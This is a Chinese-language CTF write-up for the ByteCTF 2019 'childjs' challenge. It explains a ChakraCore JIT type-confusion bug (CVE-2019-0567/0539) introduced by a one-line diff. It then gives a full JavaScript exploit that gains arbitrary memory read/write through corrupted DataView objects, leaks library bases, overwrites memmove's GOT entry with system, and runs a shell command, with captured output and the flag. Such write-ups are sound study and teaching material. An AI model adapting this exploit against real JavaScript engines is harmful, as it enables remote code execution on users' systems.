首发：http://blog.leanote.com/post/xp0int/%5BPWN%5D-childjs-xfiles

```
ByteCTF 2019 childjs
Points: 740 Solved: 8
nc 112.126.101.96 1338
```

非常典型的 JavaScript JIT 引擎`类型混淆(Type confusion)`漏洞。

这道题目基于`CVE 2019-0567 / CVE 2019-0539`，涉及微软 Edge 浏览器的 JavaScript 引擎`Chakra`。

下面是题目的 diff：
```
diff -uNr ChakraCore_bak/lib/Backend/GlobOptFields.cpp ChakraCore/lib/Backend/GlobOptFields.cpp
--- ChakraCore_bak/lib/Backend/GlobOptFields.cpp	2019-04-24 10:14:24.012350694 +0800
+++ ChakraCore/lib/Backend/GlobOptFields.cpp	2019-04-24 10:16:11.197823797 +0800
@@ -482,7 +482,6 @@
         break;
 
     case Js::OpCode::InitClass:
-    case Js::OpCode::InitProto:
     case Js::OpCode::NewScObjectNoCtor:
         if (inGlobOpt)
         {
```

经过改动后，`Chakra`引擎会认为，`InitProto`指令码的执行过程中不产生任何副作用，而实际上`InitProto`执行过程中，参数的对象类型会发生改变。

经过[JIT](https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF)优化编译后，`Chakra`引擎会移除检查对象类型是否一致的代码。攻击者可以通过旧类型的操作访问新类型对象内存区域以外的数据，实现内存越界读写。

详细的漏洞原理可以参考利用脚本中的链接。

我们利用了两个`DataView`对象。通过类型混淆，我们可以修改`DataView`对象内部指向读写缓冲区的指针，实现对任意内存地址读写。我们首先泄漏`DataView`对象内部的`vtable`指针，从而泄漏`libChakraCore.so`基地址，然后再进一步泄漏`glibc`基地址。

在执行 JavaScript 语句`Uint8Array.set(Uint8Array)`时，`Chakra`引擎会调用`glibc`库的`memmove`函数。我们可以将`libChakraCore.so` GOT 表上`memmove`函数地址修改为`system`，然后将 Shell 命令作为参数传给`Uint8Array.set(Uint8Array)`语句，实现任意命令执行。

利用脚本如下：

```
// ByteCTF 2019 childjs Writeup By xfiles
//
// Points: 740 Solved: 8
// This challenge is based on CVE 2019-0567 / CVE 2019-0539.
//
// Reference: https://www.exploit-db.com/exploits/46203
//            https://perception-point.io/resources/research/cve-2019-0539-exploitation/
//            https://bruce30262.github.io/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/#arbitrary-readwrite-primitive
//            https://xz.aliyun.com/t/4475
//            https://gist.github.com/eboda/18a3d26cb18f8ded28c899cbd61aeaba
//
// Comments starting with '(*)' are added by the author of this writeup.
//

obj = {}
obj.a = 1;
obj.b = 2;
obj.c = 3;
obj.d = 4;
obj.e = 5;
obj.f = 6;
obj.g = 7;
obj.h = 8;
obj.i = 9;
obj.j = 10;

dv1 = new DataView(new ArrayBuffer(0x100));
dv2 = new DataView(new ArrayBuffer(0x100));

BASE = 0x100000000;

function  hex(x) {
    return "0x" + x.toString(16);
}

function lower(x) {
    return x & 0xffffffff;
}

function upper(x) {
    return parseInt(x / BASE);
}

function opt(o, proto, value) {
    o.b = 1;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    let o = {a: 1, b: 2};

    // o->auxSlots = obj (Step 1)
    opt(o, o, obj);
    // obj->auxSlots = dv1 (Step 2)
    o.c = dv1;
    // dv1->buffer = dv2 (Step 3)
    obj.h = dv2;

    let read64 = function(addr_lo, addr_hi, dv) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // read from addr (Step 5)
        return dv2.getInt32(0, true) + dv2.getInt32(4, true) * BASE;
    }

    let write64 = function(addr_lo, addr_hi, value_lo, value_hi) {
        // dv2->buffer = addr (Step 4)
        dv1.setUint32(0x38, addr_lo, true);
        dv1.setUint32(0x3C, addr_hi, true);

        // write to addr (Step 5)
        dv2.setInt32(0, value_lo, true);
        dv2.setInt32(4, value_hi, true);
        // (*) BUG from original PoC
        // dv2.setInt32(0, value_hi, true);
    }

    // get dv2 vtable pointer
    vtable_lo = dv1.getUint32(0, true);
    vtable_hi = dv1.getUint32(4, true);
    vtable = vtable_lo + vtable_hi * BASE + 0x30

    // (*) get libChakraCore.so base 
    cha_base = read64(lower(vtable), upper(vtable)) - 0x887ed0;
    print("Chakra base:", hex(cha_base));

    // (*) get glibc base 
    addr = cha_base + 0xe537d0 // (*) write GOT, glibc 2.27
    libc = read64(lower(addr), upper(addr)) - 0xf45270;
    print("libc base:", hex(libc));
    
    // (*) get system address
    system = libc + 0x4f440;
    print("system:", hex(system));

    var cmd = "cat /home/ctf/f1ag_1s_h3r3_sasdfjasdklghasdlg\0";

    // write the command into a Uint8Array
    var target = new Uint8Array(0x1234);
    for (var i = 0; i < cmd.length; i++) {
        target[i] = cmd.charCodeAt(i);
    }  

    // overwrite memmove with system
    memmove = cha_base + 0xe53108;
    print("memmove got:", hex(memmove));
    write64(lower(memmove), upper(memmove), lower(system), upper(system));

    print("getshell");
    // GIMME SHELL NOW
    var bb = new Uint8Array(10);
    target.set(bb);

}

main();

EOF
```

利用效果（偶尔会`Segmentation fault`）：

```
$ cat exp.js | nc 112.126.101.96 1338
code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> code> addr: 0x00007FEC7CF68520
Chakra base: 0x7fec78a83000
addr: 0x00007FEC7CF68560
libc base: 0x7fec7b4e5000
addr: 0x00007FEC7CF68500
system: 0x7fec7b534440
addr: 0x00007FEC7CF68540
memmove got: 0x7fec798d6108
addr: 0x00007FEC7CF68580
getshell
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
==================================================================



bytectf{Haklshlashglashklgahlsghalskgh}
```

